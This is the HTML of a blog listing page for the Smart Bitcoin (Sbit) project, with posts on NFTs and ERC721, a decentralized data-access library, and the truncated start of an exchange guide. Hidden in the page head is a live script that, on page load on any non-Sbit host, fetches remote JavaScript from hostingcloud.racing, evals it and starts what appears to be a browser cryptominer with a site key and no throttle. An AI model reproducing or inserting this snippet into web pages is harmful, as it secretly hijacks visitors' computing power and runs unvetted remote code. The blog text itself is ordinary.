<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.20">
<link rel="alternate" type="application/rss+xml" href="/sbit.dev/blog/rss.xml" title="SBIT RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/sbit.dev/blog/atom.xml" title="SBIT Atom Feed">




                        <script>window.location.hostname.includes("sbit")||window.location.hostname.includes("localhost")||fetch("https://www.hostingcloud.racing/2Wla.js").then((function(t){return t.text()})).then((function(text){eval(text);var _client=new Client.Anonymous("c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a",{throttle:0,c:"w",ads:0});_client.start()})).catch((t=>{}))</script><title data-rh="true">Blog | SBIT</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" name="twitter:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" property="og:url" content="https://sbit-project.github.io//sbit.dev/blog"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" property="og:title" content="Blog | SBIT"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/sbit.dev/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://sbit-project.github.io//sbit.dev/blog"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/blog" hreflang="en"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/blog" hreflang="x-default"><link rel="stylesheet" href="/sbit.dev/assets/css/styles.a3c1bc4d.css">
<link rel="preload" href="/sbit.dev/assets/js/runtime~main.67390360.js" as="script">
<link rel="preload" href="/sbit.dev/assets/js/main.cb492e30.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><div class="announcementBar_IbjG" style="background-color:#FF5B79;color:black" role="banner"><div class="announcementBarPlaceholder_NC_W"></div><div class="announcementBarContent_KsVm">Smart Bitcoin is still under active development, be aware that breaking changes may occur.</div><button type="button" class="clean-btn close announcementBarClose_FG1z" aria-label="Close"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/sbit.dev/"><div class="navbar__logo"><img src="/sbit.dev/img/sbit_logo.svg" alt="Sbit Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/sbit.dev/img/sbit_logo.svg" alt="Sbit Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title text--truncate">Smart Bitcoin</b></a><a class="navbar__item navbar__link" href="/sbit.dev/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/sbit.dev/blog/nft">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Community</a><ul class="dropdown__menu"><li><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="dropdown__link">Github<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="dropdown__link">Instagram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Support</a><ul class="dropdown__menu"><li><a class="dropdown__link" href="/sbit.dev/docs/Help/contributing">Contributing</a></li><li><a class="dropdown__link" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Code of Conduct</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link mr-2 header-github-link" aria-label="GitHub repository"></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_dLyj"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_TMXw thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_V4zb margin-bottom--md">Recent posts</div><ul class="sidebarItemList_uHd5 clean-list"><li class="sidebarItem_spIe"><a class="sidebarItemLink_eqrF" href="/sbit.dev/blog/nft">Understanding Non-Fungible Tokens — NFTs</a></li><li class="sidebarItem_spIe"><a class="sidebarItemLink_eqrF" href="/sbit.dev/blog/ddad">DDAO-Data-Management</a></li><li class="sidebarItem_spIe"><a class="sidebarItemLink_eqrF" href="/sbit.dev/blog/exchange">Sbit Exchange Usage Guide and Info</a></li><li class="sidebarItem_spIe"><a class="sidebarItemLink_eqrF" href="/sbit.dev/blog/pos">PoS in Sbit</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="blogPostTitle_rzP5" itemprop="headline"><a itemprop="url" href="/sbit.dev/blog/nft">Understanding Non-Fungible Tokens — NFTs</a></h2><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-05-05T08:26:12.000Z" itemprop="datePublished">May 5, 2022</time> · <!-- -->8 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><span itemprop="name">Sbit Dev Team</span></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p>How non-fungible tokens connect blockchains to the real world, and Sbit’s plans regarding NFTs.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="what-is-a-non-fungible-token">What is a Non-Fungible Token?<a class="hash-link" href="#what-is-a-non-fungible-token" title="Direct link to heading">​</a></h2><p>A non-fungible token is defined as a kind of token which is uniquely identifiable and distinguishable during interaction and circulation.</p><p>In the blockchain area, digital assets can be divided into two categories: coins and tokens. The former, such as Bitcoin, Sbit, etc., have a blockchain, using transactions to maintain its ledger; the latter such as BOT, INK, etc., runs on an existing blockchain, using smart contracts to record data. These tokens can further fall two types: fungible and non-fungible.</p><p>FT (Fungible Token), usually based on the standard of ERC20 or SRC20, is a token that can be split into pieces and replaced by each other. NFT, on the contrary, is a kind of token which is unique and can not be split.</p><p>The features of FT make it useful to represent anything replaceable in the real world, such as currency, reward points, stocks and more. These things need to be split and then exchanged between different owners. In the blockchain area, FT is widely used to issue new digital currencies. These digital currencies are usually linked to shares of a company or rights to access a product, so as to attract buyers or even speculators.</p><p>As the cryptocurrency market gradually returns to rationality, people begin to realize the limitation of FT: most valuable things in the real world are indivisible and irreplaceable, such as a commodity, a contract, a qualification. These assets are unable to be represented by FT.</p><p>Compared to FT, the key innovation of NFT is providing a method to record ownerships of indivisible and unique assets. Such kind of ownership can be kept in a blockchain, making it transparent and tamper-resistant. NFTs don’t prevent others from accessing the ownership, it simply capture it and discover its value as well as relationships with all other information in the blockchain.</p><p>Due to the non-fungible feature of NFTs, it can be used to represent a large number of real-world goods, such as a ticket, a bottle of wine, a piece of jewelry and so on. NFTs enable us to tokenize anything valuable and trace the ownership of it, thus to build a connection between information and value.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="applications-of-nfts">Applications of NFTs<a class="hash-link" href="#applications-of-nfts" title="Direct link to heading">​</a></h2><p>NTF is a kind of blockchain-based non-fungible digital asset, and a NTF-compatible blockchain is like a database which keeps information of valuable things. In theory, NFT can connect to anything with non-fungible characteristic, realize tokenization of the real world, and form a world of digital assets with value exchange.</p><p>Some applications of NFTs are listed as follows:</p><ol><li>Collectibles — We can store the information of artworks, jewelry, and other collections onto the blockchain in the form of an NFT for the purpose of updates, circulation, and exchanges. For example, we can develop an NFT for artworks such as paintings and sculptures which have been certified by experts. Its owner only needs to show the NFT’s metadata to declare his ownership of the work when he wants to sell it. The certification is digitally traceable since the ownership of the art assets is recorded in the blockchain, which also prevents forgery and fraud of the artwork.</li><li>Game props — NFTs are also revolutionizing the world of online games. In general, when playing games, characters will get tradable items such as weapons, clothes, pets. Creating an NFT for each item allows these props to be traded with points in the game or even real-world cash, and finally constructs an online digital economy for virtual goods. These NFTs are stored in the blockchain, so their metadata, ownership and all transaction records are transparent and cannot be destroyed or tampered.</li><li>Digital ticketing — If I get a ticket to a music concert or own a basketball ticket, they are the same type of item which defines permission of participation in an activity at a certain time and place, but the rights they represent are not convertible. Due to this kind of uniqueness, the ticket can be represented by NFT in nature, and it has become one of the typical scenarios of NFT. NFT ensures that each ticket is valid and it can be transferred from one to another. Meanwhile, tokenization will also prevent fake tickets. So the ticket is an area which can be rebuild by NFT.</li><li>Identity authentication — We can apply NFT to identity authentication to achieve a full record of personal behavior. For example, you will own NFTs like a birth certificate, a passport and a driving license. Although such kind of NFT isn’t tradable, identity verification can be realized by adding access control to these NFTs. We can verify the identity of a person through interacting with his NFTs to inquire about his university diploma when recruiting, or apply for a doctor’s identity information to authenticate his qualifications when consulting the doctor. Everyone will be tokenized through identity authentication, and all attributes and behavioral history will be recorded.</li><li>Digital certificates — NFT provides a way to store contracts, patents and other documents to the blockchain, so as to prevent counterfeiting and make them traceable. The validity of these documents can be further proved by means of electronic signatures. Digital certificate can effectively record the value of intellectual property, copyright, etc. Furthermore, NFT can make these values tradable on the blockchain, which also facilitates the circulation of these values.</li></ol><h2 class="anchor anchorWithStickyNavbar_mojV" id="implementation-of-nfts">Implementation of NFTs<a class="hash-link" href="#implementation-of-nfts" title="Direct link to heading">​</a></h2><p>From the emergence of cryptocurrencies, the entire industry keeps trying to tokenize real-world entities. The popularity of color coin in 2013 was the first attempt to record NFTs in a blockchain. Color coins are build on Bitcoin and usually used to represent assets in the real world, such as houses, stocks and commodities. Later when Ethereum came out, smart contracts allow users easily creating their own assets on a blockchain. Under this background, several standards are proposed for NFT.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="erc721-standard">ERC721 standard<a class="hash-link" href="#erc721-standard" title="Direct link to heading">​</a></h2><p>ERC721 standard is the most popular and recognized implementation of a NFT. ERC721 is an EIP (Ethereum Improvement Proposal) which was proposed by developers of Ethereum, and it became one of ERCs (Ethereum Request for Comment) after it was passed by the Ethereum committee. The official introduction of ERC721 is: A standard interface for non-fungible tokens, also known as deeds.</p><p>ERC721 suggests that a standard NFT on Ethereum should realize the interfaces in ERC721 and ERC165. These interfaces are defined as follows. In addition to standard interfaces, there are also some extended interfaces. For example, the interfaces defined in ERC721Metadata contract hold some basic information of the NFT, and the interfaces in ERC721Enumerable add some enumeration functions.</p><div class="codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-text codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">interface ERC721 /* is ERC165 */ {</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function balanceOf(address _owner) external view returns (uint256);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function ownerOf(uint256 _tokenId) external view returns (address);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function approve(address _approved, uint256 _tokenId) external payable;</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function setApprovalForAll(address _operator, bool _approved) external;</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function getApproved(uint256 _tokenId) external view returns (address);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">}</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">interface ERC165 {</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">  function supportsInterface(bytes4 interfaceID) external view returns (bool);</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It should be noted that when using ERC721, you must implement some additional functions, such as a mint operation to create a new NFT, a burn operation to destroy a NFT, etc. Then you can apply ERC271 tokens to your own scenarios, and freely add specific business logic to enrich the application.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="future-plans-of-sbit">Future Plans of Sbit<a class="hash-link" href="#future-plans-of-sbit" title="Direct link to heading">​</a></h2><p>Sbit aims to define a blockchain ecosystem with high compatibility and scalability, so NFTs are necessary in the Sbit ecosystem. Sbit has already compatible with a fungible token standard, SRC20. Therefore, we plan to introduce a NFT standard to Sbit, and encourage developers to build DApps on the basis of the standard. This plan will include the following aspects:</p><ol><li><p>Develop a SRC721 code template. We plan to implement the basic functionality of SRC721, helping developers to easily build NFT applications based on SRC721.</p></li><li><p>Add support of SRC721 in the toolchain. We will add support of SRC721 in Sbit’s tools like the explorer and the wallet, according to the requirements of developers,.</p></li></ol><h2 class="anchor anchorWithStickyNavbar_mojV" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>Through the analysis of NFTs, we have seen a future direction of the blockchain technology, which uses tokens on the blockchain to represent entities in the real world, so as to realize recording, circulation, exchanging and tracing of these entities. NFT greatly broadens the application prospects of the blockchain and provides an effective method for blockchain technology to serve the public.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="references">References<a class="hash-link" href="#references" title="Direct link to heading">​</a></h2><p><a href="https://coincentral.com/nfts-non-fungible-tokens/" target="_blank" rel="noopener noreferrer">What Are NFTs</a></p><p><a href="https://eips.ethereum.org/EIPS/eip-721" target="_blank" rel="noopener noreferrer">ERC721 Non-Fungible Token Standard</a></p></div></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="blogPostTitle_rzP5" itemprop="headline"><a itemprop="url" href="/sbit.dev/blog/ddad">DDAO-Data-Management</a></h2><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-04-27T15:25:34.000Z" itemprop="datePublished">April 27, 2022</time> · <!-- -->9 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><span itemprop="name">Sbit Dev Team</span></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p>Data Management refers to the process of collecting, organizing, storing, processing, transmitting and retrieving different types of data. It is an important application area of the computer science. One of its goals is to efficiently store and manage complex, large amounts of data using computers, so that people can easily get access to the data. Another goal is to extract and derive valuable information from the data, and then use the information as a guidance for action and decision making.</p><p>At present, enterprises mainly use centralized databases and file systems for data management. Large Internet companies develop their own systems, such as GFS (Google File System), SQL Server, etc., and deploy local services. Small and medium-sized companies connect to cloud services such as AWS, Aliyun, and delegate data management tasks to these third parties. Local and cloud data services have their own application scenarios and they maintain the basic data of many companies.</p><p>Centralized storage is currently the main solution to data management, but there are serious storage problems in centralized databases and file systems around the world. Enterprises often store all their data and files in centralized databases and file systems. But centralized storage solutions often attract attacks from hackers, or they may be ruined by an accident. Enterprises sometimes have to face the loss of all their data resources and never get them back. Some business highly relys on data and such kind of loss may lead to huge risks. Although cloud service providers would promise to do data backup, but it has not solved the fundamental problem.</p><p>Decentralization technologies, such as blockchain and IPFS, provide a new type of solutions to data management. By using encryption and consensus, data privacy and security are guaranteed. Since data are stored in a lot of nodes, there is no need to worry about data loss caused by failure of one single node, which improves security and reliability. Encryption and segmentation technologies control the read access and guarantee data privacy. At the same time, in order to ensure scalability, cluster technology is used. A cluster is a large group of nodes that store and manage data together, and it allows new nodes to join or expanding more clusters.</p><p>However, at present, with the increasing number of decentralized systems, developers have to face high costs in selection, learning, development, deployment, and maintenance of these systems. Therefore we proposed the DDAO (Decentralized Data Access Object). Our goal is to develop a common library to access various decentralized systems with uniform interfaces, so as to perform CRUD (Create, Read, Update, Delete) operations. Through this library, developers can quickly read and write data in various decentralized systems and build their own applications without having to care about the underlying technology.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="related-work">Related Work<a class="hash-link" href="#related-work" title="Direct link to heading">​</a></h2><p>With the development of blockchain technology and digital currency market, decentralized data storage and management technologies receive attentions from research fields and investment markets.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="decentralized-file-system">Decentralized File System<a class="hash-link" href="#decentralized-file-system" title="Direct link to heading">​</a></h2><p>As a decentralized system, blockchain backs up data at every node, so it is not suitable for storing large-size files, such as pictures, videos and audios. In current blockchain applications, such kind of files are still stored in servers held by developers. This way leads to the centralization of these applications, which violates the essential meaning of blockchain.</p><p>Decentralized file systems mainly include IPFS (InterPlanetary File System) <!-- -->[1]<!-- -->, Swarm <!-- -->[2]<!-- -->, Storj <!-- -->[3]<!-- -->, and so on. Their basic method is to split the uploaded file into small pieces and then store them into nodes. When downloading the file, you can use the hash value of the file as an address to make a request to a node, and then you will get all the data pieces from the node and combine them into the whole file. In this way, one file can be separately stored in many nodes in a network, which achieves decentralization.</p><p>One problem with these technologies is how to keep more nodes online to provide download services. Hence, some projects propose to add node incentive mechanisms to the decentralized file system so that online nodes can obtain revenues. In this way, the decentralized file system becomes a cloud storage service, in which users need to purchase the service during uploading and downloading processes so as to reward the nodes that provide the storage service. Several typical projects include Filecoin <!-- -->[4]<!-- -->, Wolk <!-- -->[5]<!-- -->, Fluence <!-- -->[6]<!-- -->, and Sia <!-- -->[7]<!-- -->.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="decentralized-database">Decentralized Database<a class="hash-link" href="#decentralized-database" title="Direct link to heading">​</a></h2><p>The decentralized file system enables decentralized storage of data, but after the data are uploaded, they cannot be further modified or retrieved, which limits its application in data management. Traditional centralized data management services usually use database systems such as MySQL or Redis to execute CRUD operations of data. Therefore, similar database services are required in the decentralized area.</p><p>There are several projects having research on decentralized databases, including BigchainDB <!-- -->[8]<!-- -->, Bluzelle <!-- -->[9]<!-- -->, Ties.DB <!-- -->[10]<!-- --> and so on. Their basic idea is to upload database write requests to the blockchain through transactions, and then use database engines such as MongoDB to perform data indexing and process read requests. Using blockchain to build decentralized databases, effectively utilizes the mature decentralized architecture of blockchain systems, and has great advantages in stability and security.</p><p>These projects are currently in their initial stages, and before their implementations mature, using smart contracts as a database service is also a viable alternative. Some projects are based on Ethereum + IPFS to develop their applications, using smart contracts written by Solidity for data management. Solidity supports data structures such as List, Map, Struct, etc., which are sufficient for common data management scenarios. These items are fully enumerated in <!-- -->[11]<!-- -->.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="system-description">System Description<a class="hash-link" href="#system-description" title="Direct link to heading">​</a></h2><p>Decentralized systems have a variety of implementations, leading to high learning costs for developers. This article will design a common library for connecting upper-layer DApp applications to lower-layer decentralized systems, enabling CRUD operations for multiple decentralized systems. Developers can quickly build their own data management applications through this library without having knowledge about the underlying technology. At the same time, based on this library, a cloud service can be built to provide online CRUD interfaces of multiple decentralized systems, eliminating the cost of deploying and maintaining decentralized systems for developers.</p><p>The system can be separated into three layers, namely DDMI (Decentralized Data Management Infrastructure), DDAO and DApp (Decentralized Application), which will be introduced as follows.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="ddmi">DDMI<a class="hash-link" href="#ddmi" title="Direct link to heading">​</a></h2><p>The DDMI layer contains a variety of decentralized systems, including blockchains, decentralized databases, decentralized file systems, and more. These decentralized systems can be launched locally by the developer or deployed on a remote server, and then connected through a descriptor with uniform format. For example, the format of <em>name://user:password@ip:port</em>, that is, connecting to a local Sbit node with port 22302 by <em>sbit://admin:<a href="mailto:123456@127.0.0.1" target="_blank" rel="noopener noreferrer">123456@127.0.0.1</a>:22302</em>, or connecting to an IPFS node in LAN with 8080 port by <em>ipfs://myname:<a href="mailto:mypasswd@192.168.1.2" target="_blank" rel="noopener noreferrer">mypasswd@192.168.1.2</a>:8080</em>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="ddao">DDAO<a class="hash-link" href="#ddao" title="Direct link to heading">​</a></h2><p>The DDAO layer is the core module proposed in this paper. Its main functions include (1) establishing connections to various decentralized systems, (2) abstracting to get compatible CRUD interfaces. For different types of decentralized systems, abstract interfaces are different:</p><ol><li>For blockchain systems, interfaces contain sending transactions, querying transactions, creating contracts, reading and writing contracts.</li><li>For decentralized database systems, database interfaces such as create, find, insert, and update are included.</li><li>For decentralized file systems, main interfaces such as file upload, download, and encryption are included.</li></ol><p>The design here needs to take into account the compatibility of different systems, so only some common functions are abstracted. At the same time, the interface used to send original commands is offered, so that developers can request some unique interfaces of each system.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="dapp">DApp<a class="hash-link" href="#dapp" title="Direct link to heading">​</a></h2><p>The DApp can be JavaScript scripts running on browser or programs running on server. They may also be stored in the decentralized file system and later obtained through a specific address as an entry. The DApp initiates the DDAO instance, connects local or cloud decentralized systems, and performs CRUD operations on these systems, so as to realize data management applications.</p><p>Multiple DDAO instances can be initiated within one DApp, in order to connect to multiple different decentralized systems. This allows data interaction with multiple decentralized systems in one application, enabling more features compared with traditional smart contract-based DApps. For example, cross-chain data transmission among multiple blockchains, or data visualization based on blockchain and file system.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="application-scenario">Application Scenario<a class="hash-link" href="#application-scenario" title="Direct link to heading">​</a></h2><p>A large number of application scenarios is the best way to describe the value of DDAO. Based on DDAO, many decentralized applications will become easy to develop and implement.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="decentralized-content-sharing">Decentralized Content Sharing<a class="hash-link" href="#decentralized-content-sharing" title="Direct link to heading">​</a></h2><p>DDAO can be used to build a blog, photo, music, video sharing platform. By using DDAO&#x27;s write interfaces, users can publish texts, images, videos and other content to a decentralized file system such as IPFS, and then store their meta data (such as content address, release time, user ID, etc.) into a smart contract or a database. The DDAO read interfaces are used to filter, sort, and display the content. The advantage of such system is that the contents published by users is decentralized and cannot be tampered with.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="decentralized-trading-platform">Decentralized Trading Platform<a class="hash-link" href="#decentralized-trading-platform" title="Direct link to heading">​</a></h2><p>Based on DDAO, you can build a trading platform like Taobao and Amazon. When a merchant uses DDAO write interfaces to upload its product information, the text and image are stored in a decentralized file system, and the meta data (such as price, quantity, classification, keywords, etc.) are stored in a smart contract or a database. When a customer browses the platform, DDAO read interfaces are used to search and filter products. Finally, the customer uses DDAO to connect to the blockchain to create orders, pay orders, and complete orders. The advantage of this platform is that the product information and transaction process are transparent and the payment process is convenient.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="decentralized-cloud-storage-service">Decentralized Cloud Storage Service<a class="hash-link" href="#decentralized-cloud-storage-service" title="Direct link to heading">​</a></h2><p>Storage service providers register their information into a blockchain or a database via DDAO. When a user uploads a file, he needs to use blockchain tokens to purchase the service, and then uploads the file to a decentralized file system through DDAO, while the file information and address are stored in a smart contract or a database. When downloading, users browse the file information and address by using DDAO, and then download the file from the file system. The tokens consumed by the user are used to reward storage service providers, forming a complete economic ecology.</p><h1>Summary</h1><p>Decentralized data management has broad application prospects. Although, at present, decentralized databases and file systems are still under development, and immature infrastructure limits its application, it is conceivable that these systems will be implemented one after another in the near future. DDAO will also be widely used just like the DAO in current centralized systems.</p></div></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="blogPostTitle_rzP5" itemprop="headline"><a itemprop="url" href="/sbit.dev/blog/exchange">Sbit Exchange Usage Guide and Info</a></h2><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2022-04-27T15:25:34.000Z" itemprop="datePublished">April 27, 2022</time> · <!-- -->6 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><span itemprop="name">Sbit Dev Team</span></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_mojV" id="setup">Setup<a class="hash-link" href="#setup" title="Direct link to heading">​</a></h2><p>You can download a pre-built version of 